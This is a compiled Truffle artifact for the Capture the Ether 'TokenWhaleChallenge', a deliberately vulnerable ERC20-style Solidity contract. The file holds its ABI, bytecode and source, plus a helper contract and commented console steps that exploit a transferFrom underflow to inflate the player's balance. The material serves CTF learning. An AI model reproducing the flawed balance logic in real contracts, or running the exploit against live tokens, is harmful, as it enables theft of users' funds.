{
  "contractName": "TokenWhaleChallenge",
  "abi": [
    {
      "constant": true,
      "inputs": [],
      "name": "name",
      "outputs": [
        {
          "name": "",
          "type": "string"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "totalSupply",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "decimals",
      "outputs": [
        {
          "name": "",
          "type": "uint8"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [
        {
          "name": "",
          "type": "address"
        }
      ],
      "name": "balanceOf",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "symbol",
      "outputs": [
        {
          "name": "",
          "type": "string"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [
        {
          "name": "",
          "type": "address"
        },
        {
          "name": "",
          "type": "address"
        }
      ],
      "name": "allowance",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "name": "_player",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "name": "from",
          "type": "address"
        },
        {
          "indexed": true,
          "name": "to",
          "type": "address"
        },
        {
          "indexed": false,
          "name": "value",
          "type": "uint256"
        }
      ],
      "name": "Transfer",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "name": "owner",
          "type": "address"
        },
        {
          "indexed": true,
          "name": "spender",
          "type": "address"
        },
        {
          "indexed": false,
          "name": "value",
          "type": "uint256"
        }
      ],
      "name": "Approval",
      "type": "event"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "isComplete",
      "outputs": [
        {
          "name": "",
          "type": "bool"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "to",
          "type": "address"
        },
        {
          "name": "value",
          "type": "uint256"
        }
      ],
      "name": "transfer",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "spender",
          "type": "address"
        },
        {
          "name": "value",
          "type": "uint256"
        }
      ],
      "name": "approve",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "from",
          "type": "address"
        },
        {
          "name": "to",
          "type": "address"
        },
        {
          "name": "value",
          "type": "uint256"
        }
      ],
      "name": "transferFrom",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x60606040526040805190810160405280601281526020017f53696d706c6520455243323020546f6b656e00000000000000000000000000008152506004908051906020019061004f929190610195565b506040805190810160405280600381526020017f53455400000000000000000000000000000000000000000000000000000000008152506005908051906020019061009b929190610195565b506012600660006101000a81548160ff021916908360ff16021790555034156100c357600080fd5b604051602080610d3683398101604052808051906020019091905050806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055506103e86001819055506103e8600260008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055505061023a565b828054600181600116156101000203166002900490600052602060002090601f016020900481019282601f106101d657805160ff1916838001178555610204565b82800160010185558215610204579182015b828111156102035782518255916020019190600101906101e8565b5b5090506102119190610215565b5090565b61023791905b8082111561023357600081600090555060010161021b565b5090565b90565b610aed806102496000396000f3006060604052600436106100a4576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff16806306fdde03146100a9578063095ea7b31461013757806318160ddd1461017957806323b872dd146101a2578063313ce5671461020357806370a082311461023257806395d89b411461027f578063a9059cbb1461030d578063b2fa1c9e1461034f578063dd62ed3e1461037c575b600080fd5b34156100b457600080fd5b6100bc6103e8565b6040518080602001828103825283818151815260200191508051906020019080838360005b838110156100fc5780820151818401526020810190506100e1565b50505050905090810190601f1680156101295780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b341561014257600080fd5b610177600480803573ffffffffffffffffffffffffffffffffffffffff16906020019091908035906020019091905050610486565b005b341561018457600080fd5b61018c610570565b6040518082815260200191505060405180910390f35b34156101ad57600080fd5b610201600480803573ffffffffffffffffffffffffffffffffffffffff1690602001909190803573ffffffffffffffffffffffffffffffffffffffff16906020019091908035906020019091905050610576565b005b341561020e57600080fd5b610216610777565b604051808260ff1660ff16815260200191505060405180910390f35b341561023d57600080fd5b610269600480803573ffffffffffffffffffffffffffffffffffffffff1690602001909190505061078a565b6040518082815260200191505060405180910390f35b341561028a57600080fd5b6102926107a2565b6040518080602001828103825283818151815260200191508051906020019080838360005b838110156102d25780820151818401526020810190506102b7565b50505050905090810190601f1680156102ff5780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b341561031857600080fd5b61034d600480803573ffffffffffffffffffffffffffffffffffffffff16906020019091908035906020019091905050610840565b005b341561035a57600080fd5b61036261092b565b604051808215151515815260200191505060405180910390f35b341561038757600080fd5b6103d2600480803573ffffffffffffffffffffffffffffffffffffffff1690602001909190803573ffffffffffffffffffffffffffffffffffffffff16906020019091905050610999565b6040518082815260200191505060405180910390f35b60048054600181600116156101000203166002900480601f01602080910402602001604051908101604052809291908181526020018280546001816001161561010002031660029004801561047e5780601f106104535761010080835404028352916020019161047e565b820191906000526020600020905b81548152906001019060200180831161046157829003601f168201915b505050505081565b80600360003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508173ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff167f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925836040518082815260200191505060405180910390a35050565b60015481565b80600260008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054101515156105c457600080fd5b600260008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205481600260008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054011015151561065357600080fd5b80600360008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054101515156106de57600080fd5b80600360008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206000828254039250508190555061077282826109be565b505050565b600660009054906101000a900460ff1681565b60026020528060005260406000206000915090505481565b60058054600181600116156101000203166002900480601f0160208091040260200160405190810160405280929190818152602001828054600181600116156101000203166002900480156108385780601f1061080d57610100808354040283529160200191610838565b820191906000526020600020905b81548152906001019060200180831161081b57829003601f168201915b505050505081565b80600260003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020541015151561088e57600080fd5b600260008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205481600260008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054011015151561091d57600080fd5b61092782826109be565b5050565b6000620f4240600260008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020541015905090565b6003602052816000526040600020602052806000526040600020600091509150505481565b80600260003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206000828254039250508190555080600260008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600082825401925050819055508173ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef836040518082815260200191505060405180910390a350505600a165627a7a7230582066ff1306a84539b4e90d53980d60c52d692d6f81d4813a9b4ca72fcd615630b90029",
  "source": "pragma solidity ^0.4.21;\r\n\r\nimport './OtherContract.sol';\r\n\r\n/*\r\nvar tokenWhaleChallenge = await TokenWhaleChallenge.deployed();\r\nvar tokenWhaleHelper = await TokenWhaleHelper.deployed();\r\nawait tokenWhaleChallenge.approve(tokenWhaleHelper.address, 1000000000000)\r\nawait tokenWhaleHelper.steal()\r\n\r\ntokenWhaleChallenge.balanceOf(accounts[0])\r\ntokenWhaleChallenge.approve(accounts[0], 1000000000000)\r\ntokenWhaleChallenge.transferFrom(accounts[0], tokenWhaleHelper.address, 500)\r\ntokenWhaleChallenge.balanceOf(tokenWhaleHelper.address)\r\n\r\ntokenWhaleHelper.approve(tokenWhaleHelper.address, 1000000000000)\r\nawait tokenWhaleHelper.transferFrom(accounts[0], accounts[0], 1)\r\n\r\n\r\n\r\nvar tokenWhaleChallenge = await TokenWhaleChallenge.deployed();\r\nvar tokenWhaleHelper = await TokenWhaleHelper.deployed();\r\n(await tokenWhaleChallenge.balanceOf(accounts[0])).toNumber();\r\n(await tokenWhaleChallenge.balanceOf(tokenWhaleHelper.address)).toNumber()\r\nawait tokenWhaleChallenge.approve(tokenWhaleHelper.address, 1000000000000)\r\nawait tokenWhaleHelper.transferFrom(accounts[0], accounts[0], 1)\r\nawait tokenWhaleHelper.approve(tokenWhaleHelper.address, 9999999999)\r\nawait tokenWhaleHelper.transferFrom(tokenWhaleHelper.address, accounts[0], 9999999999)\r\n(await tokenWhaleChallenge.balanceOf(accounts[0])).toNumber()\r\n(await tokenWhaleChallenge.balanceOf(tokenWhaleHelper.address)).toString()\r\nawait tokenWhaleChallenge.isComplete()\r\n*/\r\n\r\ncontract TokenWhaleHelper is OtherContract {\r\n    function() public payable { \r\n    }\r\n\r\n    function withdraw() public {\r\n        msg.sender.transfer(address(this).balance);\r\n    }\r\n\r\n    function getBalance(address requested) public view returns (uint256) {\r\n        require(otherContract != 0);\r\n        TokenWhaleChallenge tokenWhaleChallenge = TokenWhaleChallenge(otherContract);\r\n        return tokenWhaleChallenge.balanceOf(requested);\r\n    }\r\n\r\n    function isComplete() public view returns (bool) {\r\n        require(otherContract != 0);\r\n        TokenWhaleChallenge tokenWhaleChallenge = TokenWhaleChallenge(otherContract);\r\n        return tokenWhaleChallenge.isComplete();\r\n    }\r\n\r\n    function approve(address spender, uint256 value) public {\r\n        require(otherContract != 0);\r\n        TokenWhaleChallenge tokenWhaleChallenge = TokenWhaleChallenge(otherContract);\r\n        tokenWhaleChallenge.approve(spender, value);\r\n    }\r\n\r\n    function transfer(address to, uint256 value) public {\r\n        require(otherContract != 0);\r\n        TokenWhaleChallenge tokenWhaleChallenge = TokenWhaleChallenge(otherContract);\r\n        tokenWhaleChallenge.transfer(to, value);\r\n    }\r\n\r\n    function transferFrom(address from, address to, uint256 value) public {\r\n        require(otherContract != 0);\r\n        TokenWhaleChallenge tokenWhaleChallenge = TokenWhaleChallenge(otherContract);\r\n        tokenWhaleChallenge.transferFrom(from, to, value);\r\n    }\r\n}\r\n\r\ncontract TokenWhaleChallenge {\r\n    address player;\r\n\r\n    uint256 public totalSupply;\r\n    mapping(address => uint256) public balanceOf;\r\n    mapping(address => mapping(address => uint256)) public allowance;\r\n\r\n    string public name = \"Simple ERC20 Token\";\r\n    string public symbol = \"SET\";\r\n    uint8 public decimals = 18;\r\n\r\n    function TokenWhaleChallenge(address _player) public {\r\n        player = _player;\r\n        totalSupply = 1000;\r\n        balanceOf[player] = 1000;\r\n    }\r\n\r\n    function isComplete() public view returns (bool) {\r\n        return balanceOf[player] >= 1000000;\r\n    }\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n\r\n    function _transfer(address to, uint256 value) internal {\r\n        balanceOf[msg.sender] -= value;\r\n        balanceOf[to] += value;\r\n\r\n        emit Transfer(msg.sender, to, value);\r\n    }\r\n\r\n    function transfer(address to, uint256 value) public {\r\n        require(balanceOf[msg.sender] >= value);\r\n        require(balanceOf[to] + value >= balanceOf[to]);\r\n\r\n        _transfer(to, value);\r\n    }\r\n\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n\r\n    function approve(address spender, uint256 value) public {\r\n        allowance[msg.sender][spender] = value;\r\n        emit Approval(msg.sender, spender, value);\r\n    }\r\n\r\n    function transferFrom(address from, address to, uint256 value) public {\r\n        require(balanceOf[from] >= value);\r\n        require(balanceOf[to] + value >= balanceOf[to]);\r\n        require(allowance[from][msg.sender] >= value);\r\n\r\n        allowance[from][msg.sender] -= value;\r\n        _transfer(to, value);\r\n    }\r\n}\r\n",
  "sourcePath": "C:\\defi\\capturetheether\\contracts\\TokenWhaleChallenge.sol",
  "compiler": {
    "name": "solc",
    "version": "0.4.21+commit.dfe3193c.Emscripten.clang"
  },
  "schemaVersion": "3.4.3",
  "updatedAt": "2021-11-09T15:02:26.147Z",
  "networkType": "ethereum",
  "devdoc": {
    "methods": {}
  },
  "userdoc": {
    "methods": {}
  }
}